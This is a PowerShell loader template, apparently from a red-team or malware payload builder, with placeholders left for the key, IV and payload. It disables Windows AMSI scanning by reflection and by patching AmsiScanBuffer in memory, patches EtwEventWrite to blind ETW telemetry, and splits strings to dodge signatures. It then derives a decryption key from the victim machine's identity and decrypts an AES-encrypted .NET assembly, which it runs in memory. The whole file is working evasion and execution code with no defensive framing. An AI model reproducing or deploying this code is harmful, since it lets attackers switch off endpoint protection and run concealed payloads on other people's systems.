# AMSI bypass (reflection — no Add-Type compilation)
try{
$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils')
$f=$a.GetField('am'+'siInit'+'Failed','NonPublic,Static')
$f.SetValue($null,$true)
}catch{}

# Patch AmsiScanBuffer for CLR Assembly.Load scanning
try{
$t=[AppDomain].Assembly.GetType('Microsoft.Win32.Win32'+'Native')
$gm=$t.GetMethod('GetModuleHandle','NonPublic,Static',$null,[type[]]@([string]),$null)
$gp=$t.GetMethod('GetProcAddress','NonPublic,Static',$null,[type[]]@([System.Runtime.InteropServices.HandleRef],[string]),$null)
$hA=$gm.Invoke($null,@("amsi.dll"))
if($hA -ne [IntPtr]::Zero){
$ref=New-Object System.Runtime.InteropServices.HandleRef($null,$hA)
$addr=$gp.Invoke($null,@($ref,"Amsi"+"Scan"+"Buffer"))
$hK=$gm.Invoke($null,@("kernel32.dll"))
$refK=New-Object System.Runtime.InteropServices.HandleRef($null,$hK)
$vpAddr=$gp.Invoke($null,@($refK,"Virtual"+"Protect"))
$ab=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("A")),[System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$mb=$ab.DefineDynamicModule("A",$false)
$tb=$mb.DefineType("D",'Class,Public,Sealed',[System.MulticastDelegate])
$cb=$tb.DefineConstructor('RTSpecialName,HideBySig,Public',[System.Reflection.CallingConventions]::Standard,[type[]]@([Object],[IntPtr]))
$cb.SetImplementationFlags('Runtime,Managed')
$ib=$tb.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',[bool],[type[]]@([IntPtr],[UIntPtr],[uint32],[uint32].MakeByRefType()))
$ib.SetImplementationFlags('Runtime,Managed')
$dt=$tb.CreateType()
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpAddr,$dt)
$p=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
$old=0
$vp.Invoke($addr,[UIntPtr]::new($p.Length),0x40,[ref]$old)|Out-Null
[System.Runtime.InteropServices.Marshal]::Copy($p,0,$addr,$p.Length)
$vp.Invoke($addr,[UIntPtr]::new($p.Length),$old,[ref]$old)|Out-Null
}
}catch{}

# ETW bypass
try{
$hN=$gm.Invoke($null,@("ntdll.dll"))
if($hN -ne [IntPtr]::Zero){
$refN=New-Object System.Runtime.InteropServices.HandleRef($null,$hN)
$etwAddr=$gp.Invoke($null,@($refN,"Etw"+"Event"+"Write"))
if($etwAddr -ne [IntPtr]::Zero){
$ep=[byte[]](0x33,0xC0,0xC3)
$old2=0
$vp.Invoke($etwAddr,[UIntPtr]::new($ep.Length),0x40,[ref]$old2)|Out-Null
[System.Runtime.InteropServices.Marshal]::Copy($ep,0,$etwAddr,$ep.Length)
$vp.Invoke($etwAddr,[UIntPtr]::new($ep.Length),$old2,[ref]$old2)|Out-Null
}}
}catch{}

# KEYING_START
function DeriveKey([byte[]]$salt,[string]$keying){
$props=$keying.Split(",") | ForEach-Object{$_.Trim().ToLowerInvariant()} | Sort-Object
$sb=[System.Text.StringBuilder]::new()
foreach($p in $props){
$val=""
switch($p){
"hostname"{$val=[Environment]::MachineName}
"domain"{$val=[Environment]::UserDomainName}
"user"{$val=[Environment]::UserName}
"machineguid"{try{$val=(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography").MachineGuid}catch{}}
}
[void]$sb.Append("$p=$($val.ToUpperInvariant())`n")
}
$data=[Text.Encoding]::UTF8.GetBytes($sb.ToString())
$combined=New-Object byte[] ($salt.Length+$data.Length)
[Buffer]::BlockCopy($salt,0,$combined,0,$salt.Length)
[Buffer]::BlockCopy($data,0,$combined,$salt.Length,$data.Length)
$sha=[Security.Cryptography.SHA256]::Create()
return $sha.ComputeHash($combined)
}
$salt=[Convert]::FromBase64String("YOURSALTHERE")
$keyBytes=DeriveKey $salt "YOURKEYINGHERE"
# KEYING_END

# STATICKEY_START
$keyBytes=[Convert]::FromBase64String("YOURKEYHERE")
# STATICKEY_END

# DECRYPT_AES_START
$enc=[Convert]::FromBase64String("YOURPAYLOADHERE")
$ivBytes=[Convert]::FromBase64String("YOURIVHERE")
$aes=New-Object Security.Cryptography.RijndaelManaged
$aes.Key=$keyBytes
$aes.IV=$ivBytes
$aes.Mode=[Security.Cryptography.CipherMode]::CBC
$aes.Padding=[Security.Cryptography.PaddingMode]::PKCS7
$dec=$aes.CreateDecryptor()
$clear=$dec.TransformFinalBlock($enc,0,$enc.Length)
# DECRYPT_AES_END

$enc=$null;$keyBytes=$null;$ivBytes=$null

$asm=[Reflection.Assembly]::Load($clear)
$entry=$asm.EntryPoint
if($entry){
$params=$entry.GetParameters()
if($params.Length -eq 0){$entry.Invoke($null,$null)}
else{$entry.Invoke($null,@(,[string[]]@(YOURARGS)))}
}
